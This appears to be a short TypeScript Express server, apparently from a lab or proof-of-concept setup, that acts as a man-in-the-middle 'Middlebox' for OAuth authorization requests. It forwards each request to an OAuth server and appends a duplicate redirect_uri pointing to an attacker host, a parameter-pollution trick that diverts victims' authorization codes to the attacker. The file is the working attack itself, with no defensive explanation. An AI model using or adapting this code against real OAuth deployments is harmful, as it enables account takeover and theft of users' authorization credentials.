import express from "express";

const app = express();

app.get("/oauth/authorize", (req, res) => {
    const {redirect_uri} = req.query
    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri: redirect_uri as string,
    });

    res.redirect(`http://oauthserver:3001/oauth/authorize?${params}&redirect_uri=http://attacker:3003`);
});

app.listen(8080, () => console.log("Middlebox running on :8080"));
